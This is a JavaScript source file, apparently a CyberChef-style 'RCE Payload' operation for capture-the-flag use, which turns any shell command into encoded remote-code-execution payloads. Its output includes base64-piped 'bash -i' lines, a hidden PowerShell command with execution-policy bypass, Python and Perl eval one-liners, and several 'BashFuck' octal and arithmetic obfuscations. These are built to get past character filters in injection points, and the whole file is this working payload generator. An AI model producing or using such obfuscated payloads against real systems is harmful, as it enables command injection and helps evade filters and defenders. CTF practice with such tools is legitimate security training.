/**
 * @author wolfyu [wolfyu1991@qq.com]
 * @copyright Crown Copyright 2024
 * @license Apache-2.0
 */

import Operation from "../Operation.mjs";
import OperationError from "../errors/OperationError.mjs";
import { toBase64 } from "../lib/Base64.mjs";

/**
 * RCE Payload operation
 */
class RCEPayload extends Operation {

    /**
     * RCEPayload constructor
     */
    constructor() {
        super();

        this.name = "RCE Payload";
        this.module = "CTF";
        this.description = "\u547d\u4ee4\u6267\u884c\u7f16\u7801";
        this.infoURL = ""; // Usually a Wikipedia link. Remember to remove localisation (i.e. https://wikipedia.org/etc rather than https://en.wikipedia.org/etc)
        this.inputType = "string";
        this.outputType = "string";
        this.args = [
            /* Example arguments. See the project wiki for full details.
            {
                name: "First arg",
                type: "string",
                value: "Don't Panic"
            },
            {
                name: "Second arg",
                type: "number",
                value: 42
            }
            */
        ];
    }

    /**
     * @param {string} input
     * @param {Object[]} args
     * @returns {string}
     */
    run(input, args) {
        // const [firstArg, secondArg] = args;
        if (!input) throw new OperationError("请输入要执行的命令");
        const shell = toBase64(input);
        let poshInput = "";
        for (let i = 0; i < input.length; i++) {
            poshInput += input[i] + unescape("%00");
        }
        poshInput = toBase64(poshInput);
        const output = [];
        output.push("Payload\n");
        output.push(`${"Bash - 1".padEnd(12, " ")}:echo ${shell}|base64 -d|bash -i`);
        output.push(`${"Bash - 2".padEnd(12, " ")}:bash -c {echo, ${shell}}|{base64, -d}|{bash, -i}`);
        output.push(`${"PowerShell".padEnd(12, " ")}:powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc ${poshInput}`);
        output.push(`${"Python".padEnd(12, " ")}:python -c exec('${shell}'.decode('base64'))`);
        output.push(`${"Perl".padEnd(12, " ")}:perl -MMIME::Base64 -e eval(decode_base64('${shell}'))`);
        output.push("\nBashFuck\n");
        const cmd = input;
        const payloads = [
            { title: "Normal OTC", data: this.nomalOtc(cmd) },
            { title: "Bit", data: this.bashfuckX(cmd, "bit") },
            { title: "Zero", data: this.bashfuckX(cmd, "zero") },
            { title: "C", data: this.bashfuckX(cmd, "c") },
            { title: "Bashfuck Y", data: this.bashfuckY(cmd) }
        ];
        payloads.forEach(payload => {
            output.push(`字符集 (${payload.data.totalUsed}) : ${payload.data.charset} : 长度 (${payload.data.payloadLength})`);
            output.push(payload.data.payload);
        });
        return output.join("\n");
    }

    /**
     *
     */
    info(s) {
        let total = 0;
        const usedChars = new Set();
        for (const c of s) {
            if (c.match(/[ -~]/) && !usedChars.has(c)) {
                total++;
                usedChars.add(c);
            }
        }
        return {
            charset: Array.from(usedChars).sort().join(" "),
            totalUsed: total,
            payloadLength: s.length,
            payload: s
        };
    }

    /**
     *
     */
    getOct(c) {
        return c.charCodeAt(0).toString(8);  // 将字符的ASCII值转换为八进制字符串
    }

    /**
     *
     */
    nomalOtc(cmd) {
        let payload = "$'";
        for (const c of cmd) {
            payload += "\\" + this.getOct(c);
        }
        payload += "'";
        return this.info(payload);
    }

    /**
     *
     */
    bashfuckX(cmd, form) {
        let bashStr = "";
        for (const c of cmd) {
            const binaryStr = parseInt(this.getOct(c), 10).toString(2);
            bashStr += "\\\\$(($((1<<1))#" + binaryStr + "))";
        }

        let payloadBit = bashStr;
        let payloadZero = bashStr.replace(/1/g, "${##}");  // 用 ${##} 来替换 1
        let payloadC = bashStr.replace(/1/g, "${##}").replace(/0/g, "${#}");  // 用 ${#} 来替换 0

        if (form === "bit") {
            payloadBit = "$0<<<$0\\<\\<\\<\\$\\'" + payloadBit + "\\'";
            return this.info(payloadBit);
        } else if (form === "zero") {
            payloadZero = "$0<<<$0\\<\\<\\<\\$\\'" + payloadZero + "\\'";
            return this.info(payloadZero);
        } else if (form === "c") {
            payloadC = "${!#}<<<${!#}\\<\\<\\<\\$\\'" + payloadC + "\\'";
            return this.info(payloadC);
        }
    }

    /**
     *
     */
    bashfuckY(cmd) {
        const octList = [
            "$(())",  // 0
            "$((~$(($((~$(())))$((~$(())))))))",  // 1
            "$((~$(($((~$(())))$((~$(())))$((~$(())))))))",  // 2
            "$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))",  // 3
            "$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))",  // 4
            "$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))",  // 5
            "$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))",  // 6
            "$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))",  // 7
        ];
        let bashFuck = "";
        bashFuck += "__=$(())";  // set __ to 0
        bashFuck += "&&";  // splicing
        bashFuck += "${!__}<<<${!__}\\<\\<\\<\\$\\'";  // got 'sh'

        for (const c of cmd) {
            bashFuck += "\\\\";
            for (const i of this.getOct(c)) {
                bashFuck += octList[parseInt(i, 10)];
            }
        }

        bashFuck += "\\'";
        return this.info(bashFuck);
    }

}

export default RCEPayload;
